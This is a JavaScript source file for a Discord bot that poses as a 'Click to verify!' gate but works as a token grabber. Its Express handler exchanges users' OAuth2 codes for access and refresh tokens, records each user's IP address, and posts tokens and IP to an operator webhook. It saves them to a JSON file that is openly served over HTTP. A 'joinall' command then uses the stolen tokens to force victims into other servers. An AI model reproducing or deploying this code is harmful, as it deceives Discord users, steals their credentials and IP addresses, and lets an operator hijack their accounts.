const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    //Discord.Intents.FLAGS.GUILD_BANS,
    //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    //Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    //Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `Abi Auth`,
      type: "WATCHING",
    },
    status: "online"
  }
});
const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");


process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kalash.client_id)
  form.append('client_secret', kalash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token



      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(


                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **Old User Re-Verified**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<a:Mcm_cyanarrow:1068105107868242022> Name: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> IP: \`${ip}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> ID: \`${te.data.id}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> Acces Token: \`${ac_token}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> Refresh Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            fetch(`${kalash.wehhook2}`, {
              
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **Old User Re-Verified**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<a:Mcm_cyanarrow:1068105107868242022> Name: \`${te.data.username}#${te.data.discriminator}\`` +

                      
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> ID: \`${te.data.id}\`` ,


                  },
                ],
              }),
            })
            return
              
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<a:Mcm_cyanarrow:1068105107868242022> Name: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> IP: \`${ip}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> ID: \`${te.data.id}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> Acces Token: \`${ac_token}\`` +
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> Refresh Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            fetch(`${kalash.wehhook2}`, {
              
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<a:Mcm_cyanarrow:1068105107868242022> Name: \`${te.data.username}#${te.data.discriminator}\`` +

                      
                      `\n\n<a:Mcm_cyanarrow:1068105107868242022> ID: \`${te.data.id}\`` ,


                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

client.on("ready", () => {

  console.log(`${chalk.blue('BOT done')}\n${chalk.green('->')} The bot is connected to [ ${client.user.username} ], it uses   : ${kalash.prefix}\n${chalk.green('->')} invite of bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
  
  
})



client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.help} Axium Auths`,


        description: `${emoji.command} IMPORTANT COMMANDS\n[${kalash.prefix}links](${kalash.support}), [${kalash.prefix}verify](${kalash.support}), [${kalash.prefix}users](${kalash.support}), [${kalash.prefix}joinall](${kalash.support})\n\n${emoji.prefix} Prefix :- [${kalash.prefix}](${kalash.support})`,


        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://images-ext-1.discordapp.net/external/uOCYNVBcUZHtpVulEvZCzK2L1SHtLs3DZyf8AARHpPQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/989185958698168390/228dbf8d03014849f64cc8c35b70e75c.png?width=422&height=422`
        }

      }],
    })
  }

  


  
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} Invite:`,
        description: `${emoji.links} **OAuth2 Link:** ${kalash.authLink}\n\`\`\`${kalash.authLink}\`\`\`\n${emoji.links} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://images-ext-1.discordapp.net/external/uOCYNVBcUZHtpVulEvZCzK2L1SHtLs3DZyf8AARHpPQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/989185958698168390/228dbf8d03014849f64cc8c35b70e75c.png?width=422&height=422`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }

  



  if (cmd === "cleans") {
    await client.clean(message)
  }

  if (cmd === "refresh") {
    await client.refreshTokens(message)
  }

  
  if (cmd === "verify") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**Click the button below to verify!**`,
        "image": {
          "url": "https://media.discordapp.net/attachments/1058689091270611044/1070244222747287553/Picsart_23-02-01_12-58-11-890.jpg?width=975&height=413"
        },
        
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅ Click to verify!",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }



  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.user} **Joining users...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.clean(message)
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.refreshTokens(message)
      }


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Joining users...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Joinall`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://images-ext-1.discordapp.net/external/uOCYNVBcUZHtpVulEvZCzK2L1SHtLs3DZyf8AARHpPQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/989185958698168390/228dbf8d03014849f64cc8c35b70e75c.png?width=422&height=422`
          }
        }]
      }).catch(() => { })
    })
  }
  if (cmd === "users") {




    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} AuthBot Users`,
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\n`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://images-ext-1.discordapp.net/external/uOCYNVBcUZHtpVulEvZCzK2L1SHtLs3DZyf8AARHpPQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/989185958698168390/228dbf8d03014849f64cc8c35b70e75c.png?width=422&height=422`
          }

        }]
      })
    })
  }
})

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(process.env.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID CHECK THE INTENT OR TOKEN`)
})


app.listen(kalash.port, () => console.log('Connecting...'))


client.on('debug', (a)=>{ 
  if(a.startsWith(`Hit a 429`)){ 
    process.kill(1) 
  } 
}); 

client.on("rateLimit", data => { 
  process.kill(1) 
}) 

client.on('rateLimited', () => { 
  process.kill(1);
});
